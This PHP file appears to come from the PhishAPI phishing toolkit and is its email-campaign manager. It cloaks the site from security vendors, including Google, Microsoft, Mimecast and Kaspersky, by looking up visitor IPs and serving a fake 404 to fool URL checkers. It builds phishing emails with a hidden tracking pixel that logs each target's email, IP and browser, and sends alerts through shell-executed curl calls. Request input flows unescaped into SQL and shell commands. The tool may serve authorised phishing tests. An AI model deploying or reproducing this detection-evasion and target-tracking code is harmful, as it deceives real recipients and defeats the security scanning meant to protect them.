<?php

// Pulls in Required Connection Variables
ob_start();
require '../config.php';
ob_end_clean();

// Enter Your Phishing URL Below
$url = $APIDomain."/campaigns";

$allowed = "- *Accessed Phishing Site* -";

// This section of code doesn't allow Gmail or Microsoft to inspect links to avoid blacklisting
$ip = $_SERVER['REMOTE_ADDR'];
//$ip = "52.59.102.42";
$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
$org = $details->org;

// List of Orgs to be Blacklisted
$blockorgs = array("Google","Microsoft","Forcepoint","Mimecast","ZSCALER","Fortinet","Amazon","PALO ALTO","RIPE","McAfee","M247","Internap","AS205100","YISP","Kaspersky","Berhad","DigitalOcean","IP Volume","Markus","ColoCrossing","Norton","Datacamp Limited","Scalair SAS","NForce Entertainment","Wintek Corporation","ONLINE S.A.S.","WestHost","Labitat","Orange Polska Spolka Akcyjna","OVH SAS","DediPath","AVAST","GoDaddy","SunGard","Netcraft","Emsisoft","CHINANET","Rackspace","Selectel","Sia Nano IT","AS1257","Zenlayer","Hetzner","AS51852","TalkTalk Communications","Spectre Operations","VolumeDrive","Powerhouse Management","HIVELOCITY","SoftLayer Technologies","AS3356","AS855","AS7459","AS42831","AS61317","AS5089","Faction","Plusnet","Total Server","AS262997","AS852","Guanghuan Xinwang","AS174","AS45090","AS41887","Contabo","IPAX","AS58224","AS18002","HangZhou","Linode","AS6849","AS34665","SWIFT ONLINE BORDER","AS38511","AS131111","Telefonica del Peru","BRASIL S.A","Merit Network","Beijing","QuadraNet","Afrihost","Vimpelcom","Allstream","Verizon","HostRoyale","Hurricane Electric","AS12389","Packet Exchange","AS52967","AS45974","Fastweb","AS17552","Alibaba","AS12978","AS43754","CariNet","AS28006","Free Technologies","DataHata","GHOSTnet","AS55720","Emerald Onion","AS208323","AS6730","AS11042","AS53667","AS28753","AS28753","Globalhost d.o.o","AS133119","Huawei","FastNet","AS267124","BKTech","Optisprint","AS24151","Pogliotti","321net","AS4800","Kejizhongyi","SIMBANET","AS42926","Web2Objects","AS12083");

if( preg_match("(".implode("|",array_map("preg_quote",$blockorgs)).")",$org,$m)) {

// Content for Orgs to see on the Blacklist
//echo "<HTML><BODY><IMG SRC=\"https://i.imgflip.com/42oih3.jpg\"></HTML></BODY>";
// Respond With 404 Instead of Image. More Likely to Fool URL Checkers
header('HTTP/1.0 404 not found'); 
  
$allowed = "- *Jedi Mind Trick Successful* -";

} else {

?>

<!DOCTYPE html>
<html>
<head>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="../main.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<link rel="stylesheet" href="../w3.css">
<TITLE>PhishAPI</TITLE>
<link rel="apple-touch-icon" sizes="57x57" href="../images/favicon/apple-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="../images/favicon/apple-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="../images/favicon/apple-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="../images/favicon/apple-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="../images/favicon/apple-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="../images/favicon/apple-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="../images/favicon/apple-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="../images/favicon/apple-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="../images/favicon/apple-icon-180x180.png">
<link rel="icon" type="image/png" sizes="192x192"  href="../images/favicon/android-icon-192x192.png">
<link rel="icon" type="image/png" sizes="32x32" href="../images/favicon/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="96x96" href="../images/favicon/favicon-96x96.png">
<link rel="icon" type="image/png" sizes="16x16" href="../images/favicon/favicon-16x16.png">
<link rel="manifest" href="../images/favicon/manifest.json">
<meta name="msapplication-TileColor" content="#ffffff">
<meta name="msapplication-TileImage" content="../images/favicon/ms-icon-144x144.png">
<meta name="theme-color" content="#ffffff">
</head>
<body>
<FORM ACTION="../index.php" METHOD="GET">
  <div class="w3-dropdown-hover w3-right">
    <button class="w3-button w3-phishapi"><i class="fa fa-home fa-2x" aria-hidden="true" style="color: black;"></i> Home</button>
    <div class="w3-dropdown-content w3-bar-block w3-border" style="right:0">
      <a href="../index.php?fakesite=1" class="w3-bar-item w3-button"><i class="fa fa-user fa-1x" aria-hidden="true" style="color: black;"></i> Fake Portal</a>
      <a href="../phishingdocs/" class="w3-bar-item w3-button"><i class="fa fa-file-text fa-1x" aria-hidden="true" style="color: black;"></i> Weaponized Documents</a>
      <a href="campaigns" class="w3-bar-item w3-button"><i class="fa fa-envelope fa-1x" aria-hidden="true" style="color: black;"></i> Email Campaigns</a>
	  <a href="https://curtbraz.blogspot.com/2018/10/phishapi-tool-rapid-deployment-of-fake.html" class="w3-bar-item w3-button"><i class="fa fa-question-circle fa-1x" aria-hidden="true" style="color: black;"></i> Help / About</a>
	  <a href="../config/" class="w3-bar-item w3-button"><i class="fa fa-gear fa-1x" aria-hidden="true" style="color: black;"></i> Settings</a>
    </div>
  </div></FORM><br><br>
<CENTER>

<?php

// Create connection
$dbname = "campaigns";
$conn = mysqli_connect($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Delete Campaign
if(isset($_REQUEST['delete'])){
	
	$deletecampaign = $_REQUEST['delete'];
	
	$deletecampaignsql = "CALL DeleteCampaign('$deletecampaign');";

	$result = $conn->query($deletecampaignsql);
	
}

// Receive Notification Request from Embedded Email
if(isset($_REQUEST['target']) || isset($_REQUEST['campaignname'])){
	
$referer = $_SERVER['HTTP_REFERER'];

if (strpos($referer, 'campaigns') == false) {
	
$target = $_REQUEST['target'];

$campaignname = $_REQUEST['campaignname'];	
	
$ip = $_SERVER['REMOTE_ADDR'];

$ua = $_SERVER['HTTP_USER_AGENT'];
	
// Insert Request Into DATABASE
$insertrequest = "CALL InsertRequest('$target','$campaignname','$ip','$ua');";

$result = $conn->query($insertrequest);

if(isset($target) && $target != "" && isset($campaignname) && $campaignname != ""){

// Send Slack Notification	
$message = "Email was just opened by ".$target." using ".$campaignname." campaign! (<".$APIDomain."/campaigns/results?ip=".$ip."|".$ip.">)";

}

else {

if(!isset($target) || $target == ""){

$message = "Email was just opened using ".$campaignname." campaign! (<".$APIDomain."/campaigns/results?ip=".$ip."|".$ip.">)";

}

if(!isset($campaignname) || $campaignname == ""){

$message = "Email was just opened by ".$target."! (<".$APIDomain."/campaigns/results?ip=".$ip."|".$ip.">)";

}	
	
}

$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "EmailBot", "text": "'.$message.'", "icon_emoji": ":e-mail:"}\' '.$SlackIncomingWebhookURL.'';
//echo $cmd;
exec($cmd);	
	
}
}

// View an Existing Campaign Template's Contents
if(isset($_REQUEST['content'])){

$content = base64_encode($_REQUEST['content']);
$campaign = $_REQUEST['campaign'];
if(isset($_REQUEST['variable1name'])){$variable1name = $_REQUEST['variable1name'];}else{$variable1name = "";}
if(isset($_REQUEST['variable2name'])){$variable2name = $_REQUEST['variable2name'];}else{$variable2name = "";}
if(isset($_REQUEST['variable3name'])){$variable3name = $_REQUEST['variable3name'];}else{$variable3name = "";}
if(isset($_REQUEST['variable4name'])){$variable4name = $_REQUEST['variable4name'];}else{$variable4name = "";}
if(isset($_REQUEST['variable5name'])){$variable5name = $_REQUEST['variable5name'];}else{$variable5name = "";}
if(isset($_REQUEST['variable6name'])){$variable6name = $_REQUEST['variable6name'];}else{$variable6name = "";}
if(isset($_REQUEST['variable7name'])){$variable7name = $_REQUEST['variable7name'];}else{$variable7name = "";}
if(isset($_REQUEST['variable8name'])){$variable8name = $_REQUEST['variable8name'];}else{$variable8name = "";}
if(isset($_REQUEST['variable9name'])){$variable9name = $_REQUEST['variable9name'];}else{$variable9name = "";}
if(isset($_REQUEST['variable10name'])){$variable10name = $_REQUEST['variable10name'];}else{$variable10name = "";}

$createcampaignsql = "CALL CreateModifyCampaign('$campaign','$content','$variable1name','$variable2name','$variable3name','$variable4name','$variable5name','$variable6name','$variable7name','$variable8name','$variable9name','$variable10name');";

$result = $conn->query($createcampaignsql);

?>

<BR><BR><FONT COLOR="#FFFFFF"><H3>Saved!</H3></FONT>

<BR><BR><FORM METHOD="GET" ACTION="../index.php">

<button class="btn" style="width:10%" type="submit">Home</button>

</FORM>

<?php

} else {

if(isset($_REQUEST['existingcampaign'])){

$campaign = $_REQUEST['existingcampaign'];

$selectcampaignsql = "CALL SelectCampaign('$campaign');";

$result = $conn->query($selectcampaignsql);


?>

<FONT COLOR="#FFFFFF">

<h2>Email Campaign from Template</h2>
<?php if($campaign != "New"){ ?>
<form method="post" action="<?php $_SERVER["PHP_SELF"]; ?>">
<input type="hidden" name="delete" value="<?php echo $campaign; ?>">
<input type="submit" value="Delete Template">
</form>
<?php } ?>
<br>


<?php

if($campaign == "New"){ ?>

<FORM ACTION="<?php $_SERVER["PHP_SELF"]; ?>" METHOD="POST" enctype="multipart/form-data"><br>

<b>Name of Campaign: </b><INPUT TYPE="TEXT" Value="" Name="campaign">

<br><br><br><br>

<script>
function Addvariable1()
{
   var iFrame =  document.getElementById('contentbox_ifr');
   var iFrameBody;
   if ( iFrame.contentDocument )
   { // FF
     iFrameBody = iFrame.contentDocument.getElementsByTagName('body')[0];
   }
   else if ( iFrame.contentWindow )
   { // IE
     iFrameBody = iFrame.contentWindow.document.getElementsByTagName('body')[0];
   }
//    alert(iFrameBody.innerHTML);

iFrameBody.innerHTML = iFrameBody.innerHTML + "{{" + document.getElementById("variable1name").value + "}}";

iFrameBody.focus();
}

function Addvariable2()
{
   var iFrame =  document.getElementById('contentbox_ifr');
   var iFrameBody;
   if ( iFrame.contentDocument )
   { // FF
     iFrameBody = iFrame.contentDocument.getElementsByTagName('body')[0];
   }
   else if ( iFrame.contentWindow )
   { // IE
     iFrameBody = iFrame.contentWindow.document.getElementsByTagName('body')[0];
   }
//    alert(iFrameBody.innerHTML);

iFrameBody.innerHTML = iFrameBody.innerHTML + "{{" + document.getElementById("variable2name").value + "}}";

iFrameBody.focus();
}

function Addvariable3()
{
   var iFrame =  document.getElementById('contentbox_ifr');
   var iFrameBody;
   if ( iFrame.contentDocument )
   { // FF
     iFrameBody = iFrame.contentDocument.getElementsByTagName('body')[0];
   }
   else if ( iFrame.contentWindow )
   { // IE
     iFrameBody = iFrame.contentWindow.document.getElementsByTagName('body')[0];
   }
//    alert(iFrameBody.innerHTML);

iFrameBody.innerHTML = iFrameBody.innerHTML + "{{" + document.getElementById("variable3name").value + "}}";

iFrameBody.focus();
}

function Addvariable4()
{
   var iFrame =  document.getElementById('contentbox_ifr');
   var iFrameBody;
   if ( iFrame.contentDocument )
   { // FF
     iFrameBody = iFrame.contentDocument.getElementsByTagName('body')[0];
   }
   else if ( iFrame.contentWindow )
   { // IE
     iFrameBody = iFrame.contentWindow.document.getElementsByTagName('body')[0];
   }
//    alert(iFrameBody.innerHTML);

iFrameBody.innerHTML = iFrameBody.innerHTML + "{{" + document.getElementById("variable4name").value + "}}";

iFrameBody.focus();
}

function Addvariable5()
{
   var iFrame =  document.getElementById('contentbox_ifr');
   var iFrameBody;
   if ( iFrame.contentDocument )
   { // FF
     iFrameBody = iFrame.contentDocument.getElementsByTagName('body')[0];
   }
   else if ( iFrame.contentWindow )
   { // IE
     iFrameBody = iFrame.contentWindow.document.getElementsByTagName('body')[0];
   }
//    alert(iFrameBody.innerHTML);

iFrameBody.innerHTML = iFrameBody.innerHTML + "{{" + document.getElementById("variable5name").value + "}}";

iFrameBody.focus();
}

function Addvariable6()
{
   var iFrame =  document.getElementById('contentbox_ifr');
   var iFrameBody;
   if ( iFrame.contentDocument )
   { // FF
     iFrameBody = iFrame.contentDocument.getElementsByTagName('body')[0];
   }
   else if ( iFrame.contentWindow )
   { // IE
     iFrameBody = iFrame.contentWindow.document.getElementsByTagName('body')[0];
   }
//    alert(iFrameBody.innerHTML);

iFrameBody.innerHTML = iFrameBody.innerHTML + "{{" + document.getElementById("variable6name").value + "}}";

iFrameBody.focus();
}

function Addvariable7()
{
   var iFrame =  document.getElementById('contentbox_ifr');
   var iFrameBody;
   if ( iFrame.contentDocument )
   { // FF
     iFrameBody = iFrame.contentDocument.getElementsByTagName('body')[0];
   }
   else if ( iFrame.contentWindow )
   { // IE
     iFrameBody = iFrame.contentWindow.document.getElementsByTagName('body')[0];
   }
//    alert(iFrameBody.innerHTML);

iFrameBody.innerHTML = iFrameBody.innerHTML + "{{" + document.getElementById("variable7name").value + "}}";

iFrameBody.focus();
}

function Addvariable8()
{
   var iFrame =  document.getElementById('contentbox_ifr');
   var iFrameBody;
   if ( iFrame.contentDocument )
   { // FF
     iFrameBody = iFrame.contentDocument.getElementsByTagName('body')[0];
   }
   else if ( iFrame.contentWindow )
   { // IE
     iFrameBody = iFrame.contentWindow.document.getElementsByTagName('body')[0];
   }
//    alert(iFrameBody.innerHTML);

iFrameBody.innerHTML = iFrameBody.innerHTML + "{{" + document.getElementById("variable8name").value + "}}";

iFrameBody.focus();
}

function Addvariable9()
{
   var iFrame =  document.getElementById('contentbox_ifr');
   var iFrameBody;
   if ( iFrame.contentDocument )
   { // FF
     iFrameBody = iFrame.contentDocument.getElementsByTagName('body')[0];
   }
   else if ( iFrame.contentWindow )
   { // IE
     iFrameBody = iFrame.contentWindow.document.getElementsByTagName('body')[0];
   }
//    alert(iFrameBody.innerHTML);

iFrameBody.innerHTML = iFrameBody.innerHTML + "{{" + document.getElementById("variable9name").value + "}}";

iFrameBody.focus();
}

function Addvariable10()
{
   var iFrame =  document.getElementById('contentbox_ifr');
   var iFrameBody;
   if ( iFrame.contentDocument )
   { // FF
     iFrameBody = iFrame.contentDocument.getElementsByTagName('body')[0];
   }
   else if ( iFrame.contentWindow )
   { // IE
     iFrameBody = iFrame.contentWindow.document.getElementsByTagName('body')[0];
   }
//    alert(iFrameBody.innerHTML);

iFrameBody.innerHTML = iFrameBody.innerHTML + "{{" + document.getElementById("variable10name").value + "}}";

iFrameBody.focus();
}


</script>

<?php if($campaign == "New"){ ?>

Variable 1: <input id="variable1name" name="variable1name" type="text" value="" placeholder="e.g. FirstName"><input name="variable1button" type="button" value="Add" onclick="Addvariable1()" /><br />
<BR>
Variable 2: <input id="variable2name" name="variable2name" type="text" value="" placeholder="e.g. LastName"><input name="variable2button" type="button" value="Add" onclick="Addvariable2()" /><br />
<BR>
Variable 3: <input id="variable3name" name="variable3name" type="text" value="" placeholder="e.g. HyperlinkMarkup"><input name="variable3button" type="button" value="Add" onclick="Addvariable3()" /><br />
<BR>
Variable 4: <input id="variable4name" name="variable4name" type="text" value="" placeholder="e.g. SenderFirstName"><input name="variable4button" type="button" value="Add" onclick="Addvariable4()" /><br />
<BR>
Variable 5: <input id="variable5name" name="variable5name" type="text" value="" placeholder="e.g. SenderLastName"><input name="variable5button" type="button" value="Add" onclick="Addvariable5()" /><br />
<BR>
Variable 6: <input id="variable6name" name="variable6name" type="text" value="" placeholder="e.g. RecipientCompany"><input name="variable6button" type="button" value="Add" onclick="Addvariable6()" /><br />
<BR>
Variable 7: <input id="variable7name" name="variable7name" type="text" value="" placeholder="e.g. SenderCompany"><input name="variable7button" type="button" value="Add" onclick="Addvariable7()" /><br />
<BR>
Variable 8: <input id="variable8name" name="variable8name" type="text" value="" placeholder="e.g. EmailSignature"><input name="variable8button" type="button" value="Add" onclick="Addvariable8()" /><br />
<BR>
Variable 9: <input id="variable9name" name="variable9name" type="text" value="" placeholder="e.g. RecipientDepartment"><input name="variable9button" type="button" value="Add" onclick="Addvariable9()" /><br />
<BR>
Variable 10: <input id="variable10name" name="variable10name" type="text" value="" placeholder="e.g. SenderDepartment"><input name="variable10button" type="button" value="Add" onclick="Addvariable10()" /><br />
<BR>

<?php
}} else {
// IF THE CAMPAIGN IS AN EXISTING ONE, SHOW MARKUP FROM DATABASE
?>
<TABLE BORDER="0">
<TR><TH>Name of Campaign: </TH><TH><INPUT TYPE="TEXT" Value="<?php echo $campaign; ?>" Name="campaign" ID="campaigntitle"></TH></TR>

<?php } 

if($campaign != "New"){ 

$x = 1;

    // output data of each row
    while($row1 = $result->fetch_assoc()) {
?>
		
<script>
function Replacevariables()
{
   var iFrame =  document.getElementById('contentbox_ifr');
   var iFrameBody;
   if ( iFrame.contentDocument )
   { // FF
     iFrameBody = iFrame.contentDocument.getElementsByTagName('body')[0];
   }
   else if ( iFrame.contentWindow )
   { // IE
     iFrameBody = iFrame.contentWindow.document.getElementsByTagName('body')[0];
   }
//    alert(iFrameBody.innerHTML);

<?php

if($row1['Variable1Name'] != ""){

?>

var variable1value = document.getElementById("variable1name").value;

var str = iFrameBody.innerHTML;

var res = str.replace(/{{<?php echo $row1['Variable1Name']; ?>}}/g, variable1value);

iFrameBody.innerHTML = res;

<?php 

}

?>

<?php

if($row1['Variable2Name'] != ""){

?>

var variable2value = document.getElementById("variable2name").value;

var str = iFrameBody.innerHTML;

var res = str.replace(/{{<?php echo $row1['Variable2Name']; ?>}}/g, variable2value);

iFrameBody.innerHTML = res;

<?php 

}

?>

<?php

if($row1['Variable3Name'] != ""){

?>

var variable3value = document.getElementById("variable3name").value;

var str = iFrameBody.innerHTML;

var res = str.replace(/{{<?php echo $row1['Variable3Name']; ?>}}/g, variable3value);

iFrameBody.innerHTML = res;

<?php 

}

?>

<?php

if($row1['Variable4Name'] != ""){

?>

var variable4value = document.getElementById("variable4name").value;

var str = iFrameBody.innerHTML;

var res = str.replace(/{{<?php echo $row1['Variable4Name']; ?>}}/g, variable4value);

iFrameBody.innerHTML = res;

<?php 

}

?>

<?php

if($row1['Variable5Name'] != ""){

?>

var variable5value = document.getElementById("variable5name").value;

var str = iFrameBody.innerHTML;

var res = str.replace(/{{<?php echo $row1['Variable5Name']; ?>}}/g, variable5value);

iFrameBody.innerHTML = res;

<?php 

}

?>

<?php

if($row1['Variable6Name'] != ""){

?>

var variable6value = document.getElementById("variable6name").value;

var str = iFrameBody.innerHTML;

var res = str.replace(/{{<?php echo $row1['Variable6Name']; ?>}}/g, variable6value);

iFrameBody.innerHTML = res;

<?php 

}

?>

<?php

if($row1['Variable7Name'] != ""){

?>

var variable7value = document.getElementById("variable7name").value;

var str = iFrameBody.innerHTML;

var res = str.replace(/{{<?php echo $row1['Variable7Name']; ?>}}/g, variable7value);

iFrameBody.innerHTML = res;

<?php 

}

?>

<?php

if($row1['Variable8Name'] != ""){

?>

var variable8value = document.getElementById("variable8name").value;

var str = iFrameBody.innerHTML;

var res = str.replace(/{{<?php echo $row1['Variable8Name']; ?>}}/g, variable8value);

iFrameBody.innerHTML = res;

<?php 

}

?>

<?php

if($row1['Variable9Name'] != ""){

?>

var variable9value = document.getElementById("variable9name").value;

var str = iFrameBody.innerHTML;

var res = str.replace(/{{<?php echo $row1['Variable9Name']; ?>}}/g, variable9value);

iFrameBody.innerHTML = res;

<?php 

}

?>

<?php

if($row1['Variable10Name'] != ""){

?>

var variable10value = document.getElementById("variable10name").value;

var str = iFrameBody.innerHTML;

var res = str.replace(/{{<?php echo $row1['Variable10Name']; ?>}}/g, variable10value);

iFrameBody.innerHTML = res;

<?php 

}

?>

var checkBox = document.getElementById("embednotification");

if (checkBox.checked == true){

   var iFrame =  document.getElementById('contentbox_ifr');
   var iFrameBody;
   if ( iFrame.contentDocument )
   { // FF
     iFrameBody = iFrame.contentDocument.getElementsByTagName('body')[0];
   }
   else if ( iFrame.contentWindow )
   { // IE
     iFrameBody = iFrame.contentWindow.document.getElementsByTagName('body')[0];
   }
//    alert(iFrameBody.innerHTML);

iFrameBody.innerHTML = iFrameBody.innerHTML + "<IMG SRC=\"<?php echo $APIDomain; ?>/campaigns?target=" +  document.getElementById("recipientemail").value + "&campaignname=" + document.getElementById("campaigntitle").value + "\" height=1 width=1>";

}

iFrameBody.focus();

}
</script>

<TR><TD>Recipient Email Address: </TD><TD><input type="text" placeholder="someone@target.com" id="recipientemail"></TD></TR>
		
<?php
if($row1['Variable1Name'] != ""){echo "<TR><TD>Variable ".$x.": </TD><TD><input type=\"text\" placeholder=\"".$row1['Variable1Name']."\" id=\"variable1name\" value=\"\"></TD></TR>"; $x = $x + 1;}
if($row1['Variable2Name'] != ""){echo "<TR><TD>Variable ".$x.": </TD><TD><input type=\"text\" placeholder=\"".$row1['Variable2Name']."\" id=\"variable2name\" value=\"\"></TD></TR>"; $x = $x + 1;}
if($row1['Variable3Name'] != ""){echo "<TR><TD>Variable ".$x.": </TD><TD><input type=\"text\" placeholder=\"".$row1['Variable3Name']."\" id=\"variable3name\" value=\"\"></TD></TR>"; $x = $x + 1;}
if($row1['Variable4Name'] != ""){echo "<TR><TD>Variable ".$x.": </TD><TD><input type=\"text\" placeholder=\"".$row1['Variable4Name']."\" id=\"variable4name\" value=\"\"></TD></TR>"; $x = $x + 1;}
if($row1['Variable5Name'] != ""){echo "<TR><TD>Variable ".$x.": </TD><TD><input type=\"text\" placeholder=\"".$row1['Variable5Name']."\" id=\"variable5name\" value=\"\"></TD></TR>"; $x = $x + 1;}
if($row1['Variable6Name'] != ""){echo "<TR><TD>Variable ".$x.": </TD><TD><input type=\"text\" placeholder=\"".$row1['Variable6Name']."\" id=\"variable6name\" value=\"\"></TD></TR>"; $x = $x + 1;}
if($row1['Variable7Name'] != ""){echo "<TR><TD>Variable ".$x.": </TD><TD><input type=\"text\" placeholder=\"".$row1['Variable7Name']."\" id=\"variable7name\" value=\"\"></TD></TR>"; $x = $x + 1;}
if($row1['Variable8Name'] != ""){echo "<TR><TD>Variable ".$x.": </TD><TD><input type=\"text\" placeholder=\"".$row1['Variable8Name']."\" id=\"variable8name\" value=\"\"></TD></TR>"; $x = $x + 1;}
if($row1['Variable9Name'] != ""){echo "<TR><TD>Variable ".$x.": </TD><TD><input type=\"text\" placeholder=\"".$row1['Variable9Name']."\" id=\"variable9name\" value=\"\"></TD></TR>"; $x = $x + 1;}
if($row1['Variable10Name'] != ""){echo "<TR><TD>Variable ".$x.": </TD><TD><input type=\"text\" placeholder=\"".$row1['Variable10Name']."\" id=\"variable10name\" value=\"\"></TD></TR>";}

?>

<TR><TD COLSPAN="2"><b>Embed Notification for Opened Email? <input type="checkbox" checked id="embednotification"></b></TD></TR>

</TABLE>

<script src="https://cdn.tiny.cloud/1/of5ifxe3ls8fdxa89e2ja3o4h2e0de9fp38rxhwpttatu8xq/tinymce/5/tinymce.min.js"></script>
<script>
tinymce.init({
    selector: 'textarea',
    visual : false
});
</script>

<?php

echo "<br><input name=\"ReplaceVariables\" class=\"btn\" type=\"button\" value=\"Update Variables\" onclick=\"Replacevariables()\" /><br><br><textarea rows=\"20\" cols=\"80\" name=\"content\" id=\"contentbox\">".base64_decode($row1['Markup'])."</textarea>";
    }

} else { ?>

<script src="https://cloud.tinymce.com/stable/tinymce.min.js?apiKey=of5ifxe3ls8fdxa89e2ja3o4h2e0de9fp38rxhwpttatu8xq"></script>
<script>
tinymce.init({
    selector: 'textarea',
    visual : false
});
</script>

</FONT><textarea rows="20" cols="80" name="content" id="contentbox">Create a new email template here!</textarea>

<?php } 

?>

<?php

if(isset($campaign) && $campaign != "New"){

?>

<script>
function showhtml()
{
   var iFrame =  document.getElementById('contentbox_ifr');
   var iFrameBody;
   if ( iFrame.contentDocument )
   { // FF
     iFrameBody = iFrame.contentDocument.getElementsByTagName('body')[0];
   }
   else if ( iFrame.contentWindow )
   { // IE
     iFrameBody = iFrame.contentWindow.document.getElementsByTagName('body')[0];
   }

alert(iFrameBody.innerHTML);
}
</script>

<br><input class="btn" style="width:20%" type="button" onclick="showhtml()" value="View HTML" />

<?php
}
if(isset($campaign) && $campaign == "New"){

?>

<BR>
<FONT COLOR="#FFFFFF">Tip: Try Pasting Formatted Content Here From Another Source!</FONT><BR><BR>
<button class="btn" style="width:25%" type="submit">Save Campaign</button>

</FORM>

<?php }} else { ?>

<h2><font color="#FFFFFF">Select Campaign</FONT></h2>
<FORM METHOD="POST" ACTION="<?php echo $_SERVER['PHP_SELF'];?>">
<SELECT NAME="existingcampaign" width="300" style="width: 300px">

<option value="New" selected>Create New</option>

<?php

$selectcampaignsql = "SELECT DISTINCT CampaignName from content;";

$result = $conn->query($selectcampaignsql);

    // output data of each row
    while($row1 = $result->fetch_assoc()) {
//$pw = $row["pass"];
echo "<option value=\"".$row1["CampaignName"]."\">".$row1["CampaignName"]."</option>";
    }
?>
</SELECT><br><br>
<button class="btn" style="width:10%" type="submit">Go</button>
</FORM>

<BR>
<FONT COLOR="#FFFFFF"><H2>OR</H2><br>Use Your Own and Embed a Notification Tag</FONT><BR><BR>
<textarea style="text-align:center" class="js-emaillink"><IMG SRC="<?php echo $APIDomain; ?>/campaigns?target=EMAIL@RECIPIENT.COM&campaignname=ITCAMPAIGN" height="1" width="1"></textarea>
<p><button class="js-emailcopybtn btn" style="width:25%">Copy to Clipboard</button></p>

<script>
var copyEmailBtn = document.querySelector('.js-emailcopybtn');  
copyEmailBtn.addEventListener('click', function(event) {  
  // Select the email link anchor text  
  var emailLink = document.querySelector('.js-emaillink');  
  var range = document.createRange();  
  range.selectNode(emailLink);  
  window.getSelection().addRange(range);  

  try {  
    // Now that we've selected the anchor text, execute the copy command  
    var successful = document.execCommand('copy');  
    var msg = successful ? 'successful' : 'unsuccessful';  
    console.log('Copy email command was ' + msg);  
  } catch(err) {  
    console.log('Oops, unable to copy');  
  }  

  // Remove the selections - NOTE: Should use
  // removeRange(range) when it is supported  
  window.getSelection().removeAllRanges();  
});
</script>

<?php }} ?>



</CENTER>



</body>
</html>

<?php

$allowed = "- *Accessed Phishing Site* -";
}

if($allowed == "- *Jedi Mind Trick Successful* -"){$jedi = 1;}else{$jedi = 0;}

// Slack Message
if(isset($_REQUEST['id'])){
$id = $_REQUEST['id'];

// Send Slack Notification
$message = ">".$url." was visited by ".$id." from ".$ip.". ".$allowed." (`".$org."`)";
} else {
$id = "";
$message = ">".$url." was visited by ".$ip.". ".$allowed." (`".$org."`)";
}

// Set Slack Information Here
$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "PhishBot", "text": "'.$message.'", "icon_emoji": ":bell:"}\' '.$SlackIncomingWebhookURL.'';

// UNCOMMENT THIS IF YOU WANT ALERTS WHEN PEOPLE VISIT THE API
//exec($cmd);
?>
